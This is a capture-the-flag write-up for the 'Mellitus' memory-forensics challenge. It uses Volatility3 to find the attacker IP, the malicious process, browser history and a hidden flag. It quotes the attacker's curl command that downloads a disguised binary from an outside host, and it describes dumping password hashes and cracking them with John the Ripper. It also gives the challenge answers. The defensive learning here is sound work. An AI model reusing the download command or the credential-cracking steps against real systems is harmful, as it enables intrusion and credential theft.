# **Mellitus Writeup**
![image](https://github.com/user-attachments/assets/41b667e6-1a36-44f9-b4b8-4655a3a89b41)

You’ve been a SOC analyst for the last 4 years but you’ve been honing your incident response skills! It’s about time you bite the bullet and go for your dream job as an Incident Responder as that’s the path you’d like your career to follow. Currently you are going through the interview process for a medium size incident response internal team and the cocky interviewing responder has given you a tough technical challenge to test your memory forensics aptitude. Can you get all the questions right and secure the job?

**Tools:**
  - Volatility3
**Learned:**
  - Windows Memory Forensics
### **Question 1**
What was the time on the system when the memory was captured?

Initial analysis we are given 2 files a vmem and vmsn. To find the time of the memory capture I will first find what kind of capture it is. The linux plugin failed but the windows.info compiled and found this

![image](https://github.com/user-attachments/assets/4ce52b47-8146-4199-acfb-82fe636d8e5a)

### **Answer**: 2023-10: 31 13:59:26

### **Question 2**
What is the IP address of the attacker?

The windows.netstat plugin will display all connection info! Here analyzing the IP’s and ports I noticed traffic over usual ports except over 4545.. I tried that foreign address out and that is the IP of the attacker

![image](https://github.com/user-attachments/assets/2003b885-b3ae-4eeb-b744-2f06cac38ba4)

### **Answer**: 192.168.157.151

### **Question 3**
What is the name of the strange process?

The netstat plug usually shows info such as the name of the process running on the port. I did some grepping of the TA IP and found this curl command and found the name of the service

![image](https://github.com/user-attachments/assets/4b78c5c3-d3e8-468d-96a5-317f6767656b)

### **Answer**: Scvhost.exe

### **Question 4**
What is the PID of the process that launched the malicious binary?

The pstree plugin is perfect for this as it displays information about the PIDS that were running on the system when the memory was captured. Found it!

![image](https://github.com/user-attachments/assets/40225362-319e-4024-a8c3-e4c22528ef8a)

### **Answer**: 6772

### **Question 5**
What was the command that got the malicious binary onto the machine?

I found this earlier when using grep

![image](https://github.com/user-attachments/assets/589f883b-e07e-48e9-9801-23cc3213d7e0)

### **Answer**: curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe

### **Question 6**
The attacker attempted to gain entry to our host via FTP. How many users did they attempt?

Earlier I saw some noise about failed password being used from the TA IP. I am going to use that grep again and see what I can find. Found the accounts they tried

![image](https://github.com/user-attachments/assets/8c91f40b-b488-440d-a11c-27ebe92d3ed4)

### **Answer**: 3

### **Question 7**
What is the full URL of the last website the attacker visited?

I will not lie this took me a while to solve. But I found a good path going forward! For this one I had to think about how can I see the URL’s… then I began to think of some web browsers then I found the one for Chrome and using my resources I used the plugin to dump the files from that PID… it dumped a ton of files

- python3 vol.py -f “/home/buffn3rd/Desktop/mellitus./memory_dump.vmem” windows.dumpfiles: pid 8048

![image](https://github.com/user-attachments/assets/d6b0eddf-fa5f-4006-a276-77cfbd4156c8)

Finally this file here file.0xc40aa9259df0.0xc40aa4ec6be0.SharedCacheMap.History.vacb showed the URL. I was able to view the file using DB Browser for SQLite

### **Answer**: https://stackoverflow.com/questions/38005341/the-response-content-cannot-be-parsed-because-the-internet-explorer-engine-is-no

### **Question 8**
What is the affected users password?

I had to research which plugin and I learned the windows.hashdump will dump the hashes of all hte accounts that have logged into that PC.

![image](https://github.com/user-attachments/assets/7b69d6e9-0624-43ce-b2ea-9bcad3005238)

From there I took the hashes and stored them in a file and then ran john the ripper password cracker against the file hashes in Kali and it found the password

![image](https://github.com/user-attachments/assets/157f1abd-b10e-491f-8086-2d0c38df19bc)

### **Answer**: flowers123

### **Question 9**
There is a flag hidden related to PID 5116. Can you confirm what it is?

Similiar to question 7 I ran this command to dump the files

python3 vol.py -f “/home/buffn3rd/Desktop/mellitus./memory_dump.vmem” windows.dumpfiles: pid 5116

![image](https://github.com/user-attachments/assets/68069c21-4da4-4f34-a422-db1fbebe9806)

### **Answer**: you_Foundme!

Overall, this was an easy memory dump analysis. It felt nice to be mostly brushed up on all the plugins and know what to use when
